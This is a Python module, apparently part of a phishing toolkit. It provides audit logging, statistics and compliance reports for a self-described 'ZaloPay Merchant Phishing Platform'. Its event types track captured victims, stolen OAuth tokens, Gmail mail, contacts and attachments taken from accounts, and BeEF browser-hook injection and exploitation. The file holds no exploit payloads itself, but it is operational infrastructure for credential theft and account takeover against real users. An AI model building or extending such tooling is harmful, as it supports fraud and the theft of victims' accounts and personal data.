"""
Enhanced Activity Logging and Audit System
Comprehensive action tracking and compliance reporting for the ZaloPay Merchant Phishing Platform
"""

import os
import json
import time
import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Union
import logging
from dataclasses import dataclass, asdict
from enum import Enum
import hashlib
import ipaddress
from collections import defaultdict

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class LogLevel(Enum):
    """Log level enumeration"""
    DEBUG = "debug"
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"
    CRITICAL = "critical"

class ActionType(Enum):
    """Action type enumeration"""
    # Authentication actions
    LOGIN = "login"
    LOGOUT = "logout"
    LOGIN_FAILED = "login_failed"
    PASSWORD_CHANGE = "password_change"
    TWO_FACTOR_ENABLED = "two_factor_enabled"
    TWO_FACTOR_DISABLED = "two_factor_disabled"
    
    # Victim actions
    VICTIM_CAPTURED = "victim_captured"
    VICTIM_UPDATED = "victim_updated"
    VICTIM_DELETED = "victim_deleted"
    VICTIM_VIEWED = "victim_viewed"
    VICTIM_EXPORTED = "victim_exported"
    
    # Campaign actions
    CAMPAIGN_CREATED = "campaign_created"
    CAMPAIGN_UPDATED = "campaign_updated"
    CAMPAIGN_DELETED = "campaign_deleted"
    CAMPAIGN_STARTED = "campaign_started"
    CAMPAIGN_PAUSED = "campaign_paused"
    CAMPAIGN_STOPPED = "campaign_stopped"
    CAMPAIGN_CLONED = "campaign_cloned"
    
    # OAuth actions
    OAUTH_TOKEN_CAPTURED = "oauth_token_captured"
    OAUTH_TOKEN_REFRESHED = "oauth_token_refreshed"
    OAUTH_TOKEN_REVOKED = "oauth_token_revoked"
    OAUTH_LOGIN_ATTEMPT = "oauth_login_attempt"
    OAUTH_LOGIN_SUCCESS = "oauth_login_success"
    OAUTH_LOGIN_FAILED = "oauth_login_failed"
    
    # Gmail actions
    GMAIL_ACCESS_ATTEMPT = "gmail_access_attempt"
    GMAIL_ACCESS_SUCCESS = "gmail_access_success"
    GMAIL_ACCESS_FAILED = "gmail_access_failed"
    GMAIL_EMAIL_READ = "gmail_email_read"
    GMAIL_CONTACT_EXTRACTED = "gmail_contact_extracted"
    GMAIL_ATTACHMENT_DOWNLOADED = "gmail_attachment_downloaded"
    GMAIL_CALENDAR_ACCESSED = "gmail_calendar_accessed"
    GMAIL_DRIVE_ACCESSED = "gmail_drive_accessed"
    
    # BeEF actions
    BEEF_HOOK_INJECTED = "beef_hook_injected"
    BEEF_SESSION_ESTABLISHED = "beef_session_established"
    BEEF_COMMAND_EXECUTED = "beef_command_executed"
    BEEF_SESSION_TERMINATED = "beef_session_terminated"
    BEEF_EXPLOITATION_STARTED = "beef_exploitation_started"
    BEEF_EXPLOITATION_COMPLETED = "beef_exploitation_completed"
    
    # System actions
    SYSTEM_STARTUP = "system_startup"
    SYSTEM_SHUTDOWN = "system_shutdown"
    CONFIGURATION_CHANGED = "configuration_changed"
    BACKUP_CREATED = "backup_created"
    BACKUP_RESTORED = "backup_restored"
    MAINTENANCE_MODE_ENABLED = "maintenance_mode_enabled"
    MAINTENANCE_MODE_DISABLED = "maintenance_mode_disabled"
    
    # Security actions
    SECURITY_ALERT = "security_alert"
    SUSPICIOUS_ACTIVITY = "suspicious_activity"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    DATA_BREACH_DETECTED = "data_breach_detected"
    ENCRYPTION_KEY_ROTATED = "encryption_key_rotated"
    
    # Data actions
    DATA_EXPORTED = "data_exported"
    DATA_IMPORTED = "data_imported"
    DATA_DELETED = "data_deleted"
    DATA_ARCHIVED = "data_archived"
    DATA_RESTORED = "data_restored"

@dataclass
class AuditLogEntry:
    """Audit log entry structure"""
    log_id: str
    timestamp: datetime
    action_type: ActionType
    admin_id: Optional[str]
    victim_id: Optional[str]
    campaign_id: Optional[str]
    session_id: Optional[str]
    ip_address: str
    user_agent: str
    resource_type: str
    resource_id: Optional[str]
    old_values: Dict[str, Any]
    new_values: Dict[str, Any]
    details: Dict[str, Any]
    severity: LogLevel
    category: str
    description: str
    tags: List[str]
    encrypted_data: Dict[str, Any]
    checksum: str

@dataclass
class ComplianceReport:
    """Compliance report structure"""
    report_id: str
    report_type: str
    start_date: datetime
    end_date: datetime
    generated_at: datetime
    generated_by: str
    total_events: int
    events_by_category: Dict[str, int]
    events_by_severity: Dict[str, int]
    security_events: int
    data_access_events: int
    admin_actions: int
    suspicious_activities: int
    report_data: List[Dict[str, Any]]
    summary: str
    recommendations: List[str]

class AuditLogger:
    """Enhanced audit logging system"""
    
    def __init__(self, mongodb_connection=None, redis_client=None, encryption_manager=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.encryption_manager = encryption_manager
        self.log_buffer = []
        self.buffer_size = 100
        self.buffer_timeout = 30  # seconds
        
        # Initialize log categories
        self.categories = {
            "authentication": [ActionType.LOGIN, ActionType.LOGOUT, ActionType.LOGIN_FAILED, 
                             ActionType.PASSWORD_CHANGE, ActionType.TWO_FACTOR_ENABLED, ActionType.TWO_FACTOR_DISABLED],
            "victim_management": [ActionType.VICTIM_CAPTURED, ActionType.VICTIM_UPDATED, 
                                ActionType.VICTIM_DELETED, ActionType.VICTIM_VIEWED, ActionType.VICTIM_EXPORTED],
            "campaign_management": [ActionType.CAMPAIGN_CREATED, ActionType.CAMPAIGN_UPDATED, 
                                  ActionType.CAMPAIGN_DELETED, ActionType.CAMPAIGN_STARTED, 
                                  ActionType.CAMPAIGN_PAUSED, ActionType.CAMPAIGN_STOPPED, ActionType.CAMPAIGN_CLONED],
            "oauth_operations": [ActionType.OAUTH_TOKEN_CAPTURED, ActionType.OAUTH_TOKEN_REFRESHED, 
                               ActionType.OAUTH_TOKEN_REVOKED, ActionType.OAUTH_LOGIN_ATTEMPT, 
                               ActionType.OAUTH_LOGIN_SUCCESS, ActionType.OAUTH_LOGIN_FAILED],
            "gmail_operations": [ActionType.GMAIL_ACCESS_ATTEMPT, ActionType.GMAIL_ACCESS_SUCCESS, 
                               ActionType.GMAIL_ACCESS_FAILED, ActionType.GMAIL_EMAIL_READ, 
                               ActionType.GMAIL_CONTACT_EXTRACTED, ActionType.GMAIL_ATTACHMENT_DOWNLOADED,
                               ActionType.GMAIL_CALENDAR_ACCESSED, ActionType.GMAIL_DRIVE_ACCESSED],
            "beef_operations": [ActionType.BEEF_HOOK_INJECTED, ActionType.BEEF_SESSION_ESTABLISHED, 
                              ActionType.BEEF_COMMAND_EXECUTED, ActionType.BEEF_SESSION_TERMINATED,
                              ActionType.BEEF_EXPLOITATION_STARTED, ActionType.BEEF_EXPLOITATION_COMPLETED],
            "system_operations": [ActionType.SYSTEM_STARTUP, ActionType.SYSTEM_SHUTDOWN, 
                                 ActionType.CONFIGURATION_CHANGED, ActionType.BACKUP_CREATED, 
                                 ActionType.BACKUP_RESTORED, ActionType.MAINTENANCE_MODE_ENABLED, 
                                 ActionType.MAINTENANCE_MODE_DISABLED],
            "security_events": [ActionType.SECURITY_ALERT, ActionType.SUSPICIOUS_ACTIVITY, 
                              ActionType.UNAUTHORIZED_ACCESS, ActionType.DATA_BREACH_DETECTED, 
                              ActionType.ENCRYPTION_KEY_ROTATED],
            "data_operations": [ActionType.DATA_EXPORTED, ActionType.DATA_IMPORTED, 
                              ActionType.DATA_DELETED, ActionType.DATA_ARCHIVED, ActionType.DATA_RESTORED]
        }
        
        # Initialize severity mappings
        self.severity_mapping = {
            ActionType.LOGIN: LogLevel.INFO,
            ActionType.LOGOUT: LogLevel.INFO,
            ActionType.LOGIN_FAILED: LogLevel.WARNING,
            ActionType.VICTIM_CAPTURED: LogLevel.INFO,
            ActionType.CAMPAIGN_CREATED: LogLevel.INFO,
            ActionType.OAUTH_TOKEN_CAPTURED: LogLevel.INFO,
            ActionType.GMAIL_ACCESS_SUCCESS: LogLevel.INFO,
            ActionType.BEEF_SESSION_ESTABLISHED: LogLevel.INFO,
            ActionType.SECURITY_ALERT: LogLevel.CRITICAL,
            ActionType.SUSPICIOUS_ACTIVITY: LogLevel.ERROR,
            ActionType.UNAUTHORIZED_ACCESS: LogLevel.CRITICAL,
            ActionType.DATA_BREACH_DETECTED: LogLevel.CRITICAL
        }
    
    def log_action(self, action_type: ActionType, admin_id: str = None, victim_id: str = None, 
                  campaign_id: str = None, session_id: str = None, ip_address: str = None, 
                  user_agent: str = None, resource_type: str = None, resource_id: str = None,
                  old_values: Dict[str, Any] = None, new_values: Dict[str, Any] = None,
                  details: Dict[str, Any] = None, description: str = None, 
                  tags: List[str] = None, encrypted_data: Dict[str, Any] = None) -> str:
        """Log an action with comprehensive details"""
        try:
            # Generate log ID
            log_id = f"audit_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            # Get current timestamp
            timestamp = datetime.now(timezone.utc)
            
            # Determine severity
            severity = self.severity_mapping.get(action_type, LogLevel.INFO)
            
            # Determine category
            category = self._get_category_for_action(action_type)
            
            # Prepare encrypted data
            if encrypted_data and self.encryption_manager:
                encrypted_data = self.encryption_manager.encrypt_data(encrypted_data)
            
            # Create audit log entry
            log_entry = AuditLogEntry(
                log_id=log_id,
                timestamp=timestamp,
                action_type=action_type,
                admin_id=admin_id,
                victim_id=victim_id,
                campaign_id=campaign_id,
                session_id=session_id,
                ip_address=ip_address or "unknown",
                user_agent=user_agent or "unknown",
                resource_type=resource_type or "unknown",
                resource_id=resource_id,
                old_values=old_values or {},
                new_values=new_values or {},
                details=details or {},
                severity=severity,
                category=category,
                description=description or f"{action_type.value} action performed",
                tags=tags or [],
                encrypted_data=encrypted_data or {},
                checksum=""
            )
            
            # Calculate checksum
            log_entry.checksum = self._calculate_checksum(log_entry)
            
            # Add to buffer
            self.log_buffer.append(log_entry)
            
            # Flush buffer if needed
            if len(self.log_buffer) >= self.buffer_size:
                self._flush_buffer()
            
            logger.info(f"Audit log created: {action_type.value} - {log_id}")
            return log_id
            
        except Exception as e:
            logger.error(f"Error creating audit log: {e}")
            return None
    
    def _get_category_for_action(self, action_type: ActionType) -> str:
        """Get category for action type"""
        for category, actions in self.categories.items():
            if action_type in actions:
                return category
        return "unknown"
    
    def _calculate_checksum(self, log_entry: AuditLogEntry) -> str:
        """Calculate checksum for log entry"""
        try:
            # Create a string representation of the log entry
            log_string = f"{log_entry.log_id}{log_entry.timestamp.isoformat()}{log_entry.action_type.value}{log_entry.admin_id or ''}{log_entry.victim_id or ''}{log_entry.campaign_id or ''}{log_entry.ip_address}{log_entry.user_agent}"
            
            # Calculate SHA-256 checksum
            return hashlib.sha256(log_string.encode('utf-8')).hexdigest()
            
        except Exception as e:
            logger.error(f"Error calculating checksum: {e}")
            return ""
    
    def _flush_buffer(self):
        """Flush log buffer to database"""
        try:
            if not self.log_buffer:
                return
            
            if not self.mongodb:
                logger.warning("MongoDB not available, logs not saved")
                self.log_buffer.clear()
                return
            
            # Convert log entries to documents
            documents = []
            for log_entry in self.log_buffer:
                doc = asdict(log_entry)
                doc["timestamp"] = log_entry.timestamp
                doc["action_type"] = log_entry.action_type.value
                doc["severity"] = log_entry.severity.value
                documents.append(doc)
            
            # Insert into database
            collection = self.mongodb.audit_logs
            collection.insert_many(documents)
            
            logger.info(f"Flushed {len(documents)} audit logs to database")
            self.log_buffer.clear()
            
        except Exception as e:
            logger.error(f"Error flushing audit log buffer: {e}")
    
    def get_audit_logs(self, start_date: datetime = None, end_date: datetime = None,
                      action_type: ActionType = None, admin_id: str = None, 
                      victim_id: str = None, campaign_id: str = None,
                      severity: LogLevel = None, category: str = None,
                      limit: int = 1000, offset: int = 0) -> List[AuditLogEntry]:
        """Get audit logs with filtering"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.audit_logs
            query = {}
            
            # Build query filters
            if start_date or end_date:
                date_filter = {}
                if start_date:
                    date_filter["$gte"] = start_date
                if end_date:
                    date_filter["$lte"] = end_date
                query["timestamp"] = date_filter
            
            if action_type:
                query["action_type"] = action_type.value
            
            if admin_id:
                query["admin_id"] = admin_id
            
            if victim_id:
                query["victim_id"] = victim_id
            
            if campaign_id:
                query["campaign_id"] = campaign_id
            
            if severity:
                query["severity"] = severity.value
            
            if category:
                query["category"] = category
            
            # Execute query
            cursor = collection.find(query).sort("timestamp", -1).skip(offset).limit(limit)
            
            logs = []
            for doc in cursor:
                try:
                    log_entry = AuditLogEntry(
                        log_id=doc["log_id"],
                        timestamp=doc["timestamp"],
                        action_type=ActionType(doc["action_type"]),
                        admin_id=doc.get("admin_id"),
                        victim_id=doc.get("victim_id"),
                        campaign_id=doc.get("campaign_id"),
                        session_id=doc.get("session_id"),
                        ip_address=doc["ip_address"],
                        user_agent=doc["user_agent"],
                        resource_type=doc["resource_type"],
                        resource_id=doc.get("resource_id"),
                        old_values=doc.get("old_values", {}),
                        new_values=doc.get("new_values", {}),
                        details=doc.get("details", {}),
                        severity=LogLevel(doc["severity"]),
                        category=doc["category"],
                        description=doc["description"],
                        tags=doc.get("tags", []),
                        encrypted_data=doc.get("encrypted_data", {}),
                        checksum=doc.get("checksum", "")
                    )
                    logs.append(log_entry)
                except Exception as e:
                    logger.error(f"Error parsing audit log document: {e}")
                    continue
            
            return logs
            
        except Exception as e:
            logger.error(f"Error getting audit logs: {e}")
            return []
    
    def get_audit_statistics(self, start_date: datetime = None, end_date: datetime = None) -> Dict[str, Any]:
        """Get audit log statistics"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.audit_logs
            query = {}
            
            if start_date or end_date:
                date_filter = {}
                if start_date:
                    date_filter["$gte"] = start_date
                if end_date:
                    date_filter["$lte"] = end_date
                query["timestamp"] = date_filter
            
            # Get total count
            total_events = collection.count_documents(query)
            
            # Get events by category
            pipeline = [
                {"$match": query},
                {"$group": {"_id": "$category", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}}
            ]
            category_stats = list(collection.aggregate(pipeline))
            
            # Get events by severity
            pipeline = [
                {"$match": query},
                {"$group": {"_id": "$severity", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}}
            ]
            severity_stats = list(collection.aggregate(pipeline))
            
            # Get events by action type
            pipeline = [
                {"$match": query},
                {"$group": {"_id": "$action_type", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}},
                {"$limit": 10}
            ]
            action_stats = list(collection.aggregate(pipeline))
            
            # Get admin activity
            pipeline = [
                {"$match": {**query, "admin_id": {"$exists": True, "$ne": None}}},
                {"$group": {"_id": "$admin_id", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}},
                {"$limit": 10}
            ]
            admin_stats = list(collection.aggregate(pipeline))
            
            # Get security events
            security_events = collection.count_documents({
                **query,
                "category": "security_events"
            })
            
            # Get data access events
            data_access_events = collection.count_documents({
                **query,
                "category": {"$in": ["gmail_operations", "data_operations"]}
            })
            
            return {
                "total_events": total_events,
                "events_by_category": {item["_id"]: item["count"] for item in category_stats},
                "events_by_severity": {item["_id"]: item["count"] for item in severity_stats},
                "top_actions": {item["_id"]: item["count"] for item in action_stats},
                "top_admins": {item["_id"]: item["count"] for item in admin_stats},
                "security_events": security_events,
                "data_access_events": data_access_events
            }
            
        except Exception as e:
            logger.error(f"Error getting audit statistics: {e}")
            return {}
    
    def generate_compliance_report(self, report_type: str, start_date: datetime, 
                                 end_date: datetime, generated_by: str) -> ComplianceReport:
        """Generate compliance report"""
        try:
            report_id = f"compliance_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            # Get audit statistics
            stats = self.get_audit_statistics(start_date, end_date)
            
            # Get detailed events for report
            events = self.get_audit_logs(start_date, end_date, limit=10000)
            
            # Generate report data
            report_data = []
            for event in events:
                report_data.append({
                    "timestamp": event.timestamp.isoformat(),
                    "action_type": event.action_type.value,
                    "admin_id": event.admin_id,
                    "victim_id": event.victim_id,
                    "campaign_id": event.campaign_id,
                    "ip_address": event.ip_address,
                    "severity": event.severity.value,
                    "category": event.category,
                    "description": event.description
                })
            
            # Generate summary
            summary = self._generate_report_summary(stats, start_date, end_date)
            
            # Generate recommendations
            recommendations = self._generate_recommendations(stats, events)
            
            # Create compliance report
            report = ComplianceReport(
                report_id=report_id,
                report_type=report_type,
                start_date=start_date,
                end_date=end_date,
                generated_at=datetime.now(timezone.utc),
                generated_by=generated_by,
                total_events=stats.get("total_events", 0),
                events_by_category=stats.get("events_by_category", {}),
                events_by_severity=stats.get("events_by_severity", {}),
                security_events=stats.get("security_events", 0),
                data_access_events=stats.get("data_access_events", 0),
                admin_actions=len([e for e in events if e.admin_id]),
                suspicious_activities=len([e for e in events if e.category == "security_events"]),
                report_data=report_data,
                summary=summary,
                recommendations=recommendations
            )
            
            # Store report
            self._store_compliance_report(report)
            
            logger.info(f"Compliance report generated: {report_id}")
            return report
            
        except Exception as e:
            logger.error(f"Error generating compliance report: {e}")
            return None
    
    def _generate_report_summary(self, stats: Dict[str, Any], start_date: datetime, end_date: datetime) -> str:
        """Generate report summary"""
        try:
            total_events = stats.get("total_events", 0)
            security_events = stats.get("security_events", 0)
            data_access_events = stats.get("data_access_events", 0)
            
            summary = f"Compliance Report Summary ({start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')})\n\n"
            summary += f"Total Events: {total_events:,}\n"
            summary += f"Security Events: {security_events:,}\n"
            summary += f"Data Access Events: {data_access_events:,}\n\n"
            
            # Add category breakdown
            if stats.get("events_by_category"):
                summary += "Events by Category:\n"
                for category, count in stats["events_by_category"].items():
                    summary += f"  {category}: {count:,}\n"
                summary += "\n"
            
            # Add severity breakdown
            if stats.get("events_by_severity"):
                summary += "Events by Severity:\n"
                for severity, count in stats["events_by_severity"].items():
                    summary += f"  {severity}: {count:,}\n"
            
            return summary
            
        except Exception as e:
            logger.error(f"Error generating report summary: {e}")
            return "Error generating summary"
    
    def _generate_recommendations(self, stats: Dict[str, Any], events: List[AuditLogEntry]) -> List[str]:
        """Generate compliance recommendations"""
        try:
            recommendations = []
            
            # Check for high security event count
            security_events = stats.get("security_events", 0)
            if security_events > 100:
                recommendations.append("High number of security events detected. Review security policies and access controls.")
            
            # Check for failed login attempts
            failed_logins = len([e for e in events if e.action_type == ActionType.LOGIN_FAILED])
            if failed_logins > 50:
                recommendations.append("High number of failed login attempts. Consider implementing account lockout policies.")
            
            # Check for unauthorized access attempts
            unauthorized_access = len([e for e in events if e.action_type == ActionType.UNAUTHORIZED_ACCESS])
            if unauthorized_access > 0:
                recommendations.append("Unauthorized access attempts detected. Review access logs and strengthen authentication.")
            
            # Check for data breach indicators
            data_breaches = len([e for e in events if e.action_type == ActionType.DATA_BREACH_DETECTED])
            if data_breaches > 0:
                recommendations.append("Data breach detected. Implement immediate incident response procedures.")
            
            # Check for admin activity patterns
            admin_actions = stats.get("top_admins", {})
            if len(admin_actions) > 0:
                max_admin_actions = max(admin_actions.values())
                if max_admin_actions > 1000:
                    recommendations.append("High admin activity detected. Review admin access patterns and permissions.")
            
            # Check for missing two-factor authentication
            two_factor_events = len([e for e in events if e.action_type in [ActionType.TWO_FACTOR_ENABLED, ActionType.TWO_FACTOR_DISABLED]])
            if two_factor_events == 0:
                recommendations.append("No two-factor authentication events found. Consider implementing 2FA for enhanced security.")
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")
            return ["Error generating recommendations"]
    
    def _store_compliance_report(self, report: ComplianceReport):
        """Store compliance report"""
        try:
            if not self.mongodb:
                return
            
            collection = self.mongodb.compliance_reports
            doc = asdict(report)
            doc["start_date"] = report.start_date
            doc["end_date"] = report.end_date
            doc["generated_at"] = report.generated_at
            
            collection.insert_one(doc)
            
        except Exception as e:
            logger.error(f"Error storing compliance report: {e}")
    
    def search_audit_logs(self, search_query: str, start_date: datetime = None, 
                         end_date: datetime = None, limit: int = 100) -> List[AuditLogEntry]:
        """Search audit logs with text search"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.audit_logs
            query = {
                "$text": {"$search": search_query}
            }
            
            if start_date or end_date:
                date_filter = {}
                if start_date:
                    date_filter["$gte"] = start_date
                if end_date:
                    date_filter["$lte"] = end_date
                query["timestamp"] = date_filter
            
            cursor = collection.find(query).sort("timestamp", -1).limit(limit)
            
            logs = []
            for doc in cursor:
                try:
                    log_entry = AuditLogEntry(
                        log_id=doc["log_id"],
                        timestamp=doc["timestamp"],
                        action_type=ActionType(doc["action_type"]),
                        admin_id=doc.get("admin_id"),
                        victim_id=doc.get("victim_id"),
                        campaign_id=doc.get("campaign_id"),
                        session_id=doc.get("session_id"),
                        ip_address=doc["ip_address"],
                        user_agent=doc["user_agent"],
                        resource_type=doc["resource_type"],
                        resource_id=doc.get("resource_id"),
                        old_values=doc.get("old_values", {}),
                        new_values=doc.get("new_values", {}),
                        details=doc.get("details", {}),
                        severity=LogLevel(doc["severity"]),
                        category=doc["category"],
                        description=doc["description"],
                        tags=doc.get("tags", []),
                        encrypted_data=doc.get("encrypted_data", {}),
                        checksum=doc.get("checksum", "")
                    )
                    logs.append(log_entry)
                except Exception as e:
                    logger.error(f"Error parsing audit log document: {e}")
                    continue
            
            return logs
            
        except Exception as e:
            logger.error(f"Error searching audit logs: {e}")
            return []
    
    def get_admin_activity_summary(self, admin_id: str, days: int = 30) -> Dict[str, Any]:
        """Get admin activity summary"""
        try:
            end_date = datetime.now(timezone.utc)
            start_date = end_date - timedelta(days=days)
            
            # Get admin logs
            logs = self.get_audit_logs(start_date, end_date, admin_id=admin_id)
            
            # Analyze activity patterns
            activity_by_hour = defaultdict(int)
            activity_by_day = defaultdict(int)
            activity_by_category = defaultdict(int)
            activity_by_action = defaultdict(int)
            
            for log in logs:
                hour = log.timestamp.hour
                day = log.timestamp.strftime('%Y-%m-%d')
                
                activity_by_hour[hour] += 1
                activity_by_day[day] += 1
                activity_by_category[log.category] += 1
                activity_by_action[log.action_type.value] += 1
            
            return {
                "admin_id": admin_id,
                "period_days": days,
                "total_actions": len(logs),
                "activity_by_hour": dict(activity_by_hour),
                "activity_by_day": dict(activity_by_day),
                "activity_by_category": dict(activity_by_category),
                "activity_by_action": dict(activity_by_action),
                "most_active_hour": max(activity_by_hour.items(), key=lambda x: x[1])[0] if activity_by_hour else None,
                "most_active_day": max(activity_by_day.items(), key=lambda x: x[1])[0] if activity_by_day else None
            }
            
        except Exception as e:
            logger.error(f"Error getting admin activity summary: {e}")
            return {}
    
    def detect_suspicious_activity(self, admin_id: str = None, hours: int = 24) -> List[Dict[str, Any]]:
        """Detect suspicious activity patterns"""
        try:
            end_date = datetime.now(timezone.utc)
            start_date = end_date - timedelta(hours=hours)
            
            # Get recent logs
            logs = self.get_audit_logs(start_date, end_date, admin_id=admin_id)
            
            suspicious_activities = []
            
            # Check for unusual login patterns
            login_attempts = [log for log in logs if log.action_type == ActionType.LOGIN_FAILED]
            if len(login_attempts) > 10:
                suspicious_activities.append({
                    "type": "excessive_failed_logins",
                    "description": f"Excessive failed login attempts: {len(login_attempts)} in {hours} hours",
                    "severity": "high",
                    "count": len(login_attempts),
                    "logs": login_attempts[:5]  # First 5 for details
                })
            
            # Check for unusual data access patterns
            data_access_logs = [log for log in logs if log.category in ["gmail_operations", "data_operations"]]
            if len(data_access_logs) > 100:
                suspicious_activities.append({
                    "type": "excessive_data_access",
                    "description": f"Excessive data access: {len(data_access_logs)} operations in {hours} hours",
                    "severity": "medium",
                    "count": len(data_access_logs),
                    "logs": data_access_logs[:5]
                })
            
            # Check for unusual time patterns
            if admin_id:
                admin_logs = [log for log in logs if log.admin_id == admin_id]
                if admin_logs:
                    # Check for activity outside business hours (6 AM - 10 PM)
                    unusual_hours = [log for log in admin_logs if log.timestamp.hour < 6 or log.timestamp.hour > 22]
                    if len(unusual_hours) > 5:
                        suspicious_activities.append({
                            "type": "unusual_hours_activity",
                            "description": f"Activity outside business hours: {len(unusual_hours)} operations",
                            "severity": "medium",
                            "count": len(unusual_hours),
                            "logs": unusual_hours[:5]
                        })
            
            # Check for rapid successive actions
            if admin_logs:
                # Group by minute and check for high activity
                activity_by_minute = defaultdict(int)
                for log in admin_logs:
                    minute_key = log.timestamp.strftime('%Y-%m-%d %H:%M')
                    activity_by_minute[minute_key] += 1
                
                rapid_activity = [(minute, count) for minute, count in activity_by_minute.items() if count > 10]
                if rapid_activity:
                    suspicious_activities.append({
                        "type": "rapid_successive_actions",
                        "description": f"Rapid successive actions detected in {len(rapid_activity)} minutes",
                        "severity": "medium",
                        "count": len(rapid_activity),
                        "details": rapid_activity[:5]
                    })
            
            return suspicious_activities
            
        except Exception as e:
            logger.error(f"Error detecting suspicious activity: {e}")
            return []
    
    def cleanup_old_logs(self, days_to_keep: int = 90):
        """Clean up old audit logs"""
        try:
            if not self.mongodb:
                return
            
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_to_keep)
            
            collection = self.mongodb.audit_logs
            result = collection.delete_many({"timestamp": {"$lt": cutoff_date}})
            
            logger.info(f"Cleaned up {result.deleted_count} old audit logs")
            return result.deleted_count
            
        except Exception as e:
            logger.error(f"Error cleaning up old logs: {e}")
            return 0

# Global audit logger instance
audit_logger = None

def initialize_audit_logger(mongodb_connection=None, redis_client=None, encryption_manager=None) -> AuditLogger:
    """Initialize audit logger"""
    global audit_logger
    audit_logger = AuditLogger(mongodb_connection, redis_client, encryption_manager)
    return audit_logger

def get_audit_logger() -> AuditLogger:
    """Get audit logger instance"""
    global audit_logger
    if audit_logger is None:
        audit_logger = AuditLogger()
    return audit_logger
